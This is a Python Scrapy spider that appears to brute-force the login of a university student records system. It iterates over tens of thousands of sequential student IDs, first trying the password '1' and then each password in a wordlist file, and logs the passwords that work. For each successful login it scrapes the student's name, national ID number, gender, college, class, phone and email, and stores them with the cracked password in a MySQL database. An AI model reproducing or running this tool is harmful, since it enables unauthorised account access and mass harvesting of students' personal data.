# -*- coding: utf-8 -*-
import os

import scrapy
from students.items import StudentItem
import pymysql
from students.spiders.student_base_spider import StudentBaseSpider


class StudentsInfoSpider(StudentBaseSpider):
    name = "students_info"
    user_detail_url = 'xjInfoAction.do?oper=xjxx'
    user_info_url = 'userInfo.jsp'
    FIRST_TIME_RUNNING = True

    def start_requests(self):
        if self.FIRST_TIME_RUNNING:
            self.FIRST_TIME_RUNNING = False
            for sid in (list(range(2014020000, 2014040000))
                            + list(range(2015020000, 2015040000))
                            + list(range(2016020000, 2016040000))):
                yield scrapy.FormRequest(self.domain + self.login_url,
                                         formdata={'zjh': str(sid), 'mm': '1'},
                                         callback=self.parse,
                                         meta={'sid': sid, 'password': '1', 'cookiejar': sid},
                                         dont_filter=True)
        else:
            for password in self.load_passwords():
                for sid in self.get_sids():
                    yield scrapy.FormRequest(self.domain + self.login_url,
                                             formdata={'zjh': str(sid), 'mm': password},
                                             callback=self.parse,
                                             meta={'sid': sid, 'password': password, 'cookiejar': sid},
                                             dont_filter=True)

    def parse(self, response):
        login_status = self._check_login_status(response)
        self.logger.info('[{}] login status[{}] using password[{}]'.format(
            response.meta['sid'],
            login_status,
            response.meta['password']))
        if login_status == self.LOGIN_STATUS.WRONG_ID:
            return
        if login_status == self.LOGIN_STATUS.WRONG_PASS:
            student = StudentItem()
            student['sid'] = response.meta['sid']
            yield student
        else:
            yield scrapy.Request(self.domain + self.user_detail_url,
                                 callback=self._parse_user_detail,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'],
                                       'password': response.meta['password'],
                                       'cookiejar': response.meta['cookiejar']})

    def _parse_user_detail(self, response):
        def extract_with_css(query):
            return response.css(query).extract_first(default='null').strip()

        student = StudentItem()
        student["sid"] = extract_with_css('#tblView > tr:nth-child(1) > td:nth-child(2)::text')
        student["name"] = extract_with_css('#tblView > tr:nth-of-type(1) > td:nth-of-type(4)::text')
        gender = extract_with_css('#tblView > tr:nth-child(4) > td:nth-child(2)::text')
        student["gender"] = 1 if gender == '男' else 0
        student["id"] = extract_with_css('#tblView > tr:nth-child(3) > td:nth-child(4)::text')
        student["nationality"] = extract_with_css('#tblView > tr:nth-child(6) > td:nth-child(4)::text')
        student["college"] = extract_with_css('#tblView > tr:nth-child(13) > td:nth-child(4)::text')
        student["class_name"] = extract_with_css('#tblView > tr:nth-child(15) > td:nth-child(4)::text')
        student["password"] = response.meta["password"]

        request = scrapy.Request(self.domain + self.user_info_url,
                                 callback=self._parse_user_info,
                                 dont_filter=True,
                                 meta={'sid': response.meta['sid'], 'cookiejar': response.meta['cookiejar']})
        request.meta['student'] = student
        yield request

    @staticmethod
    def _parse_user_info(response):
        student = response.meta['student']
        text_input = response.css('input[type=text]::attr(value)').extract()
        student['tel'] = text_input[0]
        student['email'] = text_input[2]
        yield student

    def get_sids(self):
        sql = "SELECT sid FROM `students_all` " \
              "WHERE password IS NULL ORDER BY sid ASC LIMIT 1;"
        conn = pymysql.connect(**self.settings.get('MYSQL_DB_KWARGS'))
        try:
            with conn.cursor() as cursor:
                cursor.execute(sql)
                result = cursor.fetchone()
                while result:
                    yield result[0]
                    result = cursor.fetchone()
        finally:
            conn.close()

    def load_passwords(self):
        pass_file = os.path.join(self.settings.get('BASE_PATH'), "passwords.txt")
        with open(pass_file, 'r') as f:
            password = f.readline()
            while password:
                password = password.strip()
                if password:
                    yield password
                password = f.readline()
